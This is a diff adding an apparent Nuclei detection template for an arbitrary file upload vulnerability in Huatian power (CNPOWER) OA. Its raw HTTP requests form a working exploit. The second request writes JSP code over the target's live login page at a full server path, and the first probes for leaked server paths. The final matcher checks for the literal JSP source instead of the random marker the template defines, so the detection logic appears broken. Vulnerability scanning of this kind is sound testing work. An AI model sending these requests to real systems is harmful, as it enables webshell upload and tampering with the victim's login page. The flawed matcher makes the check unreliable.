@@ -1,0 +1,72 @@
+id: cnpower-oa-file-upload
+info:
+  name: CNPOWER OA Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Huatian power collaborative office system combines advanced management ideas, management modes, software technology, and network technology to provide users with a low-cost and efficient collaborative office and management platform. This template checks for an arbitrary file upload vulnerability in Huatian power OA which allows attackers to upload arbitrary files, obtain webshells, and read sensitive information.
+
+http:
+  - raw:
+      - |
+        POST /OAapp/jsp/upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
+
+        ------WebKitFormBoundary5Ur8laykKAWws2QO
+        Content-Disposition: form-data; name="file"; filename="xxx.xml"
+        Content-Type: image/png
+
+        real path
+        ------WebKitFormBoundary5Ur8laykKAWws2QO
+        Content-Disposition: form-data; name="filename"
+
+        xxx.png
+        ------WebKitFormBoundary5Ur8laykKAWws2QO--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - ".*?Tomcat/webapps/.*?\\.dat"
+          - ".*?htoadata/appdata/.*?\\.dat"
+
+  - raw:
+      - |
+        POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
+
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+        Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
+        Content-Type: image/png
+
+        <%out.print("{{rand_base(6)}}");%>
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+        Content-Disposition: form-data; name="newFileName"
+
+        D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+        ------WebKitFormBoundaryzRSYXfFlXqk6btQm--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<%out.print("  # Ensure the response contains the random string
+
+variables:
+  rand: "{{rand_base(6)}}"
